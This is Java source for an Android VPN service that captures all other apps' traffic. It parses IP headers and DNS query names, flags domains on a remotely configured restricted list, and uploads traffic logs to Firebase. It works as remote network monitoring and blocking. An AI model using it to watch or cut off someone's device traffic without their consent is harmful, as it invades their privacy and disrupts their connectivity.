package com.vikasyadavnsit.cdc.services;

import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.content.Intent;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageManager;
import android.net.VpnService;
import android.os.Build;
import android.os.ParcelFileDescriptor;

import androidx.annotation.NonNull;
import androidx.core.app.NotificationCompat;

import com.google.firebase.database.DataSnapshot;
import com.google.firebase.database.DatabaseError;
import com.google.firebase.database.ValueEventListener;
import com.vikasyadavnsit.cdc.R;
import com.vikasyadavnsit.cdc.data.VpnConfig;
import com.vikasyadavnsit.cdc.utils.FirebaseUtils;
import com.vikasyadavnsit.cdc.utils.LoggerUtils;

import java.io.FileInputStream;
import java.io.IOException;
import java.nio.ByteBuffer;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.HashMap;
import java.util.List;
import java.util.Locale;
import java.util.Map;

public class CDCVpnService extends VpnService {

    private static final String TAG = "CDCVpnService";
    private static final int MAX_PACKET_SIZE = 32767;

    private ParcelFileDescriptor vpnInterface = null;
    private Thread vpnThread = null;
    private VpnConfig currentConfig = new VpnConfig();

    private final ValueEventListener configListener = new ValueEventListener() {
        @Override
        public void onDataChange(@NonNull DataSnapshot snapshot) {
            if (snapshot.exists()) {
                VpnConfig newConfig = snapshot.getValue(VpnConfig.class);
                if (newConfig != null) {
                    boolean needsRestart = !newConfig.getRestrictedApps().equals(currentConfig.getRestrictedApps()) 
                                        || (newConfig.isEnabled() != currentConfig.isEnabled());
                    currentConfig = newConfig;
                    if (needsRestart) {
                        LoggerUtils.d(TAG, "VPN Config change detected — restarting tunnel");
                        closeTunnel();
                        if (currentConfig.isEnabled()) startVpn();
                    }
                }
            }
        }
        @Override public void onCancelled(@NonNull DatabaseError error) {}
    };

    @Override
    public void onCreate() {
        super.onCreate();
        LoggerUtils.d(TAG, "onCreate: Initializing CDCVpnService");
        FirebaseUtils.initialize(this);
        startForegroundNotification();
        FirebaseUtils.getVpnConfig(configListener);
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        if (intent != null && intent.getBooleanExtra("stop", false)) {
            LoggerUtils.i(TAG, "onStartCommand: Stop intent received, shutting down");
            closeTunnel();
            stopSelf();
            return START_NOT_STICKY;
        }
        LoggerUtils.d(TAG, "onStartCommand: Service started/sticky");
        return START_STICKY;
    }

    @Override
    public void onDestroy() {
        FirebaseUtils.getDbRef(FirebaseUtils.getPath("/appSettings/vpnConfig")).removeEventListener(configListener);
        closeTunnel();
        super.onDestroy();
    }

    private void startForegroundNotification() {
        String channelId = "vpn_service";
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel channel = new NotificationChannel(
                    channelId, "VPN Service", NotificationManager.IMPORTANCE_LOW);
            NotificationManager nm = getSystemService(NotificationManager.class);
            if (nm != null) nm.createNotificationChannel(channel);
        }
        startForeground(2, new NotificationCompat.Builder(this, channelId)
                .setSmallIcon(R.drawable.ic_launcher_foreground)
                .setContentTitle("VPN Active")
                .setContentText("Network control is active")
                .setPriority(NotificationCompat.PRIORITY_LOW)
                .build());
    }

    private synchronized void startVpn() {
        if (vpnInterface != null || !currentConfig.isEnabled()) return;

        Builder builder = new Builder();
        builder.setSession("CDCVPN").setMtu(1500).addAddress("10.0.0.2", 24);

        // Intercept all traffic when enabled as requested.
        // Note: Apps added to the VPN will lose internet unless a NAT proxy is implemented.
        List<ApplicationInfo> apps = getPackageManager().getInstalledApplications(0);
        for (ApplicationInfo app : apps) {
            try {
                if (!app.packageName.equals(getPackageName())) {
                    builder.addAllowedApplication(app.packageName);
                }
            } catch (PackageManager.NameNotFoundException ignored) {}
        }

        builder.addRoute("0.0.0.0", 0);
        builder.addRoute("::", 0);

        try {
            vpnInterface = builder.establish();
            if (vpnInterface != null) {
                LoggerUtils.i(TAG, "Selective VPN tunnel established");
                vpnThread = new Thread(this::capturePackets);
                vpnThread.start();
            }
        } catch (Exception e) {
            LoggerUtils.e(TAG, "Establish error: " + e.getMessage());
        }
    }

    private synchronized void closeTunnel() {
        if (vpnThread != null) {
            vpnThread.interrupt();
            vpnThread = null;
        }
        try {
            if (vpnInterface != null) {
                vpnInterface.close();
                vpnInterface = null;
                LoggerUtils.i(TAG, "VPN tunnel closed");
            }
        } catch (IOException e) {
            LoggerUtils.e(TAG, "Close error: " + e.getMessage());
        }
    }

    private void capturePackets() {
        try (FileInputStream in = new FileInputStream(vpnInterface.getFileDescriptor())) {
            ByteBuffer packet = ByteBuffer.allocate(MAX_PACKET_SIZE);
            long lastLogTime = 0;
            while (!Thread.currentThread().isInterrupted()) {
                int length = in.read(packet.array());
                if (length > 0) {
                    long now = System.currentTimeMillis();
                    byte[] data = packet.array();
                    int version = (data[0] >> 4) & 0x0F;

                    String proto = "UNKNOWN";
                    String src = "0.0.0.0";
                    String dst = "0.0.0.0";
                    String service = "";
                    String domain = "";
                    int ipHeaderLen = 0;

                    if (version == 4) {
                        ipHeaderLen = (data[0] & 0x0F) * 4;
                        proto = getProtocolName(data[9] & 0xFF);
                        src = getIPv4Address(data, 12);
                        dst = getIPv4Address(data, 16);
                        service = getServiceName(data, ipHeaderLen);
                        if ("DNS".equals(service)) {
                            domain = tryExtractDomain(data, ipHeaderLen);
                        }
                    }

                    boolean isBlockedDomain = !domain.isEmpty() && isDomainRestricted(domain);
                    
                    if (now - lastLogTime > 5000 || isBlockedDomain) {
                        Map<String, Object> logEntry = new HashMap<>();
                        logEntry.put("proto", proto);
                        logEntry.put("appName", isBlockedDomain ? "BLOCKED DOMAIN" : "Restricted App");
                        logEntry.put("appPkg", domain.isEmpty() ? "" : domain);
                        logEntry.put("src", src);
                        logEntry.put("dst", dst);
                        logEntry.put("service", service);
                        logEntry.put("time", new SimpleDateFormat("HH:mm:ss", Locale.getDefault()).format(new Date(now)));
                        logEntry.put("date", new SimpleDateFormat("yyyy-MM-dd", Locale.getDefault()).format(new Date(now)));
                        logEntry.put("bytes", length);

                        FirebaseUtils.logVpnTraffic(logEntry);
                        lastLogTime = now;
                    }
                    packet.clear();
                }
            }
        } catch (Exception e) {
            LoggerUtils.e(TAG, "Capture error: " + e.getMessage());
        }
    }

    private boolean isDomainRestricted(String domain) {
        if (currentConfig.getRestrictedWebsites() == null) return false;
        for (String restricted : currentConfig.getRestrictedWebsites()) {
            if (domain.toLowerCase().contains(restricted.toLowerCase())) return true;
        }
        return false;
    }

    private String tryExtractDomain(byte[] data, int ipHeaderLen) {
        try {
            int dnsStart = ipHeaderLen + 8; // UDP Header
            if (data.length < dnsStart + 12) return "";
            int qCount = ((data[dnsStart + 4] & 0xFF) << 8) | (data[dnsStart + 5] & 0xFF);
            if (qCount <= 0) return "";
            
            StringBuilder sb = new StringBuilder();
            int pos = dnsStart + 12;
            while (pos < data.length) {
                int len = data[pos] & 0xFF;
                if (len == 0) break;
                pos++;
                for (int i = 0; i < len && pos < data.length; i++) {
                    sb.append((char) data[pos++]);
                }
                if (pos < data.length && data[pos] != 0) sb.append(".");
            }
            return sb.toString();
        } catch (Exception e) { return ""; }
    }

    private String getProtocolName(int proto) {
        switch (proto) {
            case 1: return "ICMP";
            case 6: return "TCP";
            case 17: return "UDP";
            case 58: return "ICMPv6";
            default: return "IP (" + proto + ")";
        }
    }

    private String getIPv4Address(byte[] data, int offset) {
        return (data[offset] & 0xFF) + "." + (data[offset + 1] & 0xFF) + "." +
                (data[offset + 2] & 0xFF) + "." + (data[offset + 3] & 0xFF);
    }

    private String getServiceName(byte[] data, int ipHeaderLen) {
        if (data.length < ipHeaderLen + 4) return "";
        int destPort = ((data[ipHeaderLen + 2] & 0xFF) << 8) | (data[ipHeaderLen + 3] & 0xFF);
        switch (destPort) {
            case 80: return "HTTP";
            case 443: return "HTTPS";
            case 53: return "DNS";
            case 22: return "SSH";
            case 5228: case 5229: case 5230: return "FCM";
            default: return String.valueOf(destPort);
        }
    }
}
